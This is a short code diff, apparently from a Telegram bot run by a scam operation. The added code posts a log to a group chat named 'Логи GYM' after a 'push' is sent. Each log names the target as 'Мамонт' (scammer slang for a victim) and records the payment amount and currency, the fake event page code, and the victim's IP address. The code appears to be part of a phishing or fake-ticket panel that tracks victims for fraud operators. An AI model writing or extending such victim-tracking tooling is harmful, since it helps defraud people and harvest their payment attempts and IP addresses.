@@ -3017,7 +3017,24 @@ async def admin_action_handler(call: types.CallbackQuery):
                 print(f'[DEBUG] Push response: {resp.status}')
                 
                 if resp.status == 200:
-                # Надсилаємо красиве повідомлення адміну, чия це посилання
+                    # Надсилаємо повідомлення в чат "Логи GYM"
+                    push_log_message = f"🔔 Push відправлений після натискання push\n\n"
+                    if user_name:
+                        push_log_message += f"🐘 Мамонт: {user_name}\n"
+                    if event_price and event_currency:
+                        push_log_message += f"💰 Сума: {event_price} {event_currency}\n"
+                    if page_code:
+                        push_log_message += f"#️⃣ Сторінка: ?page={page_code}\n"
+                    if ip:
+                        push_log_message += f"🌍 IP: {ip}"
+                    
+                    try:
+                        await bot.send_message(APPLICATION_GROUP_ID, push_log_message)
+                        print(f'[DEBUG] Push log message sent to Логи GYM')
+                    except Exception as e:
+                        print(f'[ERROR] Failed to send push log to Логи GYM: {e}')
+                    
+                    # Надсилаємо красиве повідомлення адміну, чия це посилання
                     admin_user_id = None
                     c = conn.cursor()
                     c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
